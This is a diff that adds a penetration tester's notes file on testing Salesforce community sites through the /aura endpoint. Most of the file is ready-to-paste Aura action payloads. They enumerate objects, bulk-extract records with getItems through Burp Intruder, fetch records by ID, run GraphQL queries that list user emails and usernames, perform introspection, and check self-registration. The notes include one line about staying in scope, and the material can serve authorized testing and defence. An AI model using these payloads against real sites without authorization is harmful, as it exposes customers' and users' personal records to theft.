@@ -1,0 +1,120 @@
+Salesforce:
+
+Identify /aura endpoint
+
+Use *getConfigData* and *getCurrentApp* to retrieve a list of default and custom object names.
+
+Craft an intruder request using *getItems* and use the list of object names to request items (records) for each object. (Do this for guest and authenticated SF contexts)
+
+
+Find a POST request that contains a message, aura.context and aura.token parameter.
+
+Replace the "message" parameter with the following values:
+
+#### Enumerate Static Webpages on the SF Site (Check to make sure these are in scope)
+{"actions":[{"id":"6;a","descriptor":"serviceComponent://ui.communities.components.aura.components.communitySetup.cmc.CMCAppController/ACTION$getAppBootstrapData","callingDescriptor":"UNKNOWN","params":{}}]}
+
+	Get the list of Custom Objects (allSupportedApiNames parameter).
+	Copy all values to a text file and replace the , with \n and remove the "
+	Use the generated list in the getItems message (id:123;a)
+
+	Also look for http and https for URLs of other endpoints within the app
+		Account creation and other things can exist
+
+
+#### Enumerate Custom Objects (getConfigData)
+{"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}
+
+	This will return prefixes and their description in the apiNamesToKeyPrefixes
+
+
+#### Enumerate Additional Objects and Site Data (getCurrentApp)
+{"actions":[{"id":"2;a","descriptor":"serviceComponent://ui.global.components.one.one.controller.OneController/ACTION$getCurrentApp","callingDescriptor":"UNKNOWN","params":{}}]}
+
+
+
+#### Extract Records By Object (getItems)
+{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"OBJECT_NAME_HERE","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
+	
+	use the generated list from id:6;a in intruder in the entityNameOrId param
+	other replacements include: user, profile, account, contact, calendar, announcement, attachment
+				
+
+
+#### Get Object Definition Metadata (getObjectInfo)
+{"actions":[{"id":"3;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"OBJECT_NAME_HERE"}}]}
+
+	use the generated list from id:6;a in intruder in the objectApiName param
+	other replacements include: user, profile, account, contact, calendar, announcement, attachment
+
+
+
+#### Get Record Data by SFID (getRecord)
+{"actions":[{"id":"5;a","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"RECORD_ID_HERE"}}]}
+
+
+
+#### GraphQL on SOQL Objects via Aura (This is looking for the text string stored in Account Name field):
+{"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query%20accounts%20{%20uiapi%20{%20query%20{%20Account%20{%20edges%20{%20node%20{%20Name%20{%20value%20}%20}%20}%20}%20}%20}%20}","variables":{}}}}]}
+
+
+Returns first 10 email addresses for users. Are users other than the logged in user visible? 
+{
+  "actions": [
+    {
+      "id": "GraphQL",
+      "descriptor": "aura://RecordUiController/ACTION$executeGraphQL",
+      "callingDescriptor": "markup://forceCommunity:richText",
+      "params": {
+        "queryInput": {
+          "operationName": "userDiscovery",
+          "query": "query%20userDiscovery%20%7B%20uiapi%20%7B%20query%20%7B%20User(first%3A%2010)%20%7B%20edges%20%7B%20node%20%7B%20Id%20Username%20%7B%20value%20%7D%20Email%20%7B%20value%20%7D%20Name%20%7B%20value%20%7D%20UserType%20%7B%20value%20%7D%20%7D%20%7D%20%7D%20%7D%20%7D%20%7D",
+          "variables": {}
+        }
+      }
+    }
+  ]
+}
+
+
+GraphQL Introspection:
+{
+  "actions": [
+    {
+      "id": "GraphQL",
+      "descriptor": "aura://RecordUiController/ACTION$executeGraphQL",
+      "params": {
+        "queryInput": {
+          "operationName": "introspection",
+          "query": "query%20introspection%20%7B%20__schema%20%7B%20queryType%20%7B%20name%20%7D%20types%20%7B%20name%20kind%20description%20%7D%20%7D%20%7D",
+          "variables": {}
+        }
+      }
+    }
+  ]
+}
+
+
+
+
+#### Check if SelfRegistration is Enabled And Get URL
+{"actions":[{"id":"7;a","descriptor":"apex://applauncher.LoginFormController/ACTION$getIsSelfRegistrationEnabled","callingDescriptor":"UHNKNOWN"},{"id":"7;b","descriptor":"apex://applauncher.LoginFormController/ACTION$getSelfRegistrationUrl","callingDescriptor":"UHNKNOWN"}]}
+
+	{
+		"actions":[
+			{
+				"id":"7;a",
+				"state":"SUCCESS",
+				"returnValue":false,
+				"error":[
+				]
+			},
+			{
+				"id":"7;b",
+				"state":"SUCCESS",
+				"returnValue":null,
+				"error":[
+				]
+			}
+
+	If either of the above returnValue params are true this could be an issue
